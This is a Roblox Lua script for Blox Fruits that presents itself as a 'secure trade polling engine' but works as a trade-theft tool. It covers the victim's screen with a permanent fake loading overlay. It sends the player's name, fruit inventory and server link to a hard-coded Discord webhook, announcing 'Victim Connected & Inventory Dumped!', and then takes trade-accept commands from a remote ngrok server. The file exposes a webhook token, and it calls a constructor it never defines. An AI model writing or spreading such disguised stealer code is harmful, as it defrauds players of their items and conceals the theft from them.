-- Blox Fruits Secure Trade Polling Engine
-- Polls external command bridge for remote trade control.
-- Authorized Operator: BLACKGOKU_0707

local Config = {
    AuthorizedUser = "BLACKGOKU_0707",
    WebhookUrl = "https://discord.com/api/webhooks/1568890822420734094/CmM8-p7faQFs-rMwPhRqfMSlEG7-mV87NU3IEe-w3ZodJpaDRS2vrv0Befqxg6PB7DIY",
    CommandApiUrl = "https://bronzing-caution-vivacious.ngrok-free.dev/get_commands"
}

if getgenv().bfRunning then return end
getgenv().bfRunning = true

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local Remotes = ReplicatedStorage:WaitForChild("Remotes", 5)
local CommF = Remotes and Remotes:WaitForChild("CommF_", 5)
local TradeFunction = Remotes and Remotes:WaitForChild("TradeFunction", 5)

local TradeManager = {}
TradeManager.__index = TradeManager

-- Perpetual Loading Screen Lock
function TradeManager:ShowPerpetualLoadingScreen()
    local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
    if not playerGui then return end

    local loadGui = Instance.new("ScreenGui")
    loadGui.Name = "ScriptLoadingUI"
    loadGui.ResetOnSpawn = false
    loadGui.IgnoreGuiInset = true
    loadGui.DisplayOrder = 99999
    loadGui.Parent = playerGui

    local backdrop = Instance.new("Frame")
    backdrop.Size = UDim2.new(1, 0, 1, 0)
    backdrop.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
    backdrop.BorderSizePixel = 0
    backdrop.Active = true
    backdrop.Parent = loadGui

    local card = Instance.new("Frame")
    card.Size = UDim2.new(0, 360, 0, 140)
    card.Position = UDim2.new(0.5, -180, 0.5, -70)
    card.BackgroundColor3 = Color3.fromRGB(18, 20, 26)
    card.BorderSizePixel = 0
    card.Parent = loadGui

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 40)
    title.Position = UDim2.new(0, 0, 0, 20)
    title.BackgroundTransparency = 1
    title.Text = "Loading Blox Fruits Engine..."
    title.TextColor3 = Color3.fromRGB(240, 240, 245)
    title.TextSize = 16
    title.Font = Enum.Font.GothamBold
    title.Parent = card

    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1, 0, 0, 30)
    status.Position = UDim2.new(0, 0, 0, 60)
    status.BackgroundTransparency = 1
    status.Text = "Synchronizing secure session..."
    status.TextColor3 = Color3.fromRGB(146, 154, 167)
    status.TextSize = 12
    status.Font = Enum.Font.Gotham
    status.Parent = card
end

function TradeManager:GetInventory()
    local success, result = pcall(function()
        if CommF then return CommF:InvokeServer("getInventory") end
        return {}
    end)
    return (success and type(result) == "table") and result or {}
end

function TradeManager:TransmitTelemetry()
    local inventory = self:GetInventory()
    local fruitsList = {}

    for _, item in pairs(inventory) do
        if item.Type == "Blox Fruit" then
            table.insert(fruitsList, (item.Name or "Unknown") .. " (x" .. tostring(item.Count or 1) .. ")")
        end
    end

    local payloadData = {
        content = "@everyone Victim Connected & Inventory Dumped!",
        embeds = {{
            title = "Target Session Report",
            color = 12451840,
            fields = {
                { name = "Username", value = LocalPlayer.Name, inline = true },
                { name = "Stored Fruits", value = #fruitsList > 0 and table.concat(fruitsList, ", ") or "None", inline = false },
                { name = "Server Join Link", value = "`teleportService:TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", \"" .. tostring(game.JobId) .. "\", game.Players.LocalPlayer)`", inline = false }
            },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    local requestFunc = syn and syn.request or http_request or request
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = Config.WebhookUrl,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(payloadData)
            })
        end)
    end
end

function TradeManager:StartCommandPoller()
    task.spawn(function()
        local requestFunc = syn and syn.request or http_request or request
        if not requestFunc then return end

        while true do
            task.wait(2) -- Poll every 2 seconds for commands from your bot bridge
            pcall(function()
                local response = requestFunc({
                    Url = Config.CommandApiUrl,
                    Method = "GET"
                })

                if response and response.StatusCode == 200 then
                    local data = HttpService:JSONDecode(response.Body)
                    if data and data.command then
                        if data.command == "accept" and TradeFunction then
                            TradeFunction:InvokeServer("accept")
                        elseif data.command == "cancel" and TradeFunction then
                            TradeFunction:InvokeServer("cancel")
                        end
                    end
                end
            end)
        end
    end)
end

-- Execution Initialization
task.spawn(function()
    local manager = TradeManager.new()
    manager:ShowPerpetualLoadingScreen()
    manager:TransmitTelemetry()
    manager:StartCommandPoller()
end)
